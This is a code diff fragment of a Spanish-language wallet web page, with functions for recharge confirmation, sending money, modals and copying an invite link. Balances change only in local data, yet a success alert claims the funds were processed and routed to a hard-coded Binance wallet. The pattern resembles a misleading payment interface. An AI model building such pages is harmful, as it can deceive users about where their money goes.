+            saveUserData();
+            updateUI();
+            closeModal('recharge-modal');
+
+            // Notificación visual de éxito con la wallet de Binance
+            alert(`¡Recarga exitosa de $${amount.toFixed(2)}!\n\nLos fondos fueron procesados y enrutados directamente a tu billetera de Binance:\n${BINANCE_WALLET}`);
+        }
+
+        function processSend() {
+            const recipient = document.getElementById('send-recipient').value.trim();
+            const amount = parseFloat(document.getElementById('send-amount').value);
+            if (!recipient) { alert('Ingresa un destinatario.'); return; }
+            if (isNaN(amount) || amount <= 0) { alert('Ingresa una cantidad válida.'); return; }
+            if (amount > userData.balance) { alert('Saldo insuficiente.'); return; }
+            userData.balance -= amount;
+            userData.transactions.push({ desc: `Envío de dinero a ${recipient}`, date: new Date().toLocaleString(), amount: amount, type: 'debit' });
+            saveUserData(); updateUI(); closeModal('send-modal');
+        }
+
+        function openModal(modalId) { document.getElementById(modalId).classList.remove('hidden'); }
+        function closeModal(modalId) { document.getElementById(modalId).classList.add('hidden'); }
+
+        function copyInviteLink() {
+            const linkText = document.getElementById('invite-link-text').textContent;
+            navigator.clipboard.writeText(linkText);
+            alert('¡Enlace de invitación copiado al portapapeles! Compártelo con tus amigos.');
+        }
+    </script>
+</body>
+</html>
